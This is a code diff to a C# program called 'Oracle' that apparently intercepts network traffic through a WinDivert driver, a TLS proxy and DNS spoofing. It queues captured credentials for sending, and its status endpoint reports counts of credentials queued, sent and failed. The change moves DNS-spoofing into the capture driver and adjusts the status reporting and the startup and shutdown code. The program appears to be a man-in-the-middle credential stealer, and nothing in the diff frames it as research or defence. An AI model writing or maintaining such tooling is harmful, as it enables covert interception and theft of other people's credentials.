@@ -69,7 +69,6 @@ var ruleEngine = new Oracle.Extractor.RuleEngine();
 
 // Try WinDivert driver first, fall back to mock
 var captureDriver = CreateCaptureDriver();
-var dnsSpoofer = new DnsSpoofer();
 
 static ICaptureDriver CreateCaptureDriver()
 {
@@ -108,6 +107,7 @@ app.UseCors();
 app.MapGet("/status", () =>
 {
     var uptime = DateTime.UtcNow - _startTime;
+    var wDriver = captureDriver as WinDivertDriver;
     return Results.Ok(new
     {
         status = captureService.IsRunning ? "running" : "stopped",
@@ -115,14 +115,14 @@ app.MapGet("/status", () =>
         uptime_seconds = uptime.TotalSeconds,
         packets_captured = captureService.PacketsCaptured,
         packets_filtered = captureService.PacketsFiltered,
-        driver_packets = captureDriver is WinDivertDriver wd ? wd.DirectPacketCount : -1,
+        driver_packets = wDriver?.DirectPacketCount ?? -1,
         active_connections = connTracker.ActiveCount,
         active_tls_sessions = tlsProxy.ActiveConnections,
         total_connections = tlsProxy.TotalConnections,
         credentials_queued = credQueue.TotalEnqueued,
         credentials_sent = credQueue.TotalSent,
         credentials_failed = credQueue.TotalFailed,
-        dns_spoofed = dnsSpoofer.SpoofedCount,
+        dns_spoofed = wDriver?.DnsSpoofedCount ?? -1,
     });
 });
 
@@ -132,7 +132,6 @@ app.MapPost("/start", () =>
     // TLS proxy must start first (before capture or DNS redirect)
     tlsProxy.Start();
     captureService.Start();
-    try { dnsSpoofer.Start(); } catch { }
     return Results.Ok(new { status = "started" });
 });
 
@@ -277,7 +276,6 @@ lifetime.ApplicationStopping.Register(() =>
     Console.WriteLine("[Oracle] Shutting down...");
     captureService.Stop();
     tlsProxy.Stop();
-    dnsSpoofer.Stop();
     credQueue.Dispose();
     Console.WriteLine("[Oracle] Credential queue flushed. Goodbye.");
 });
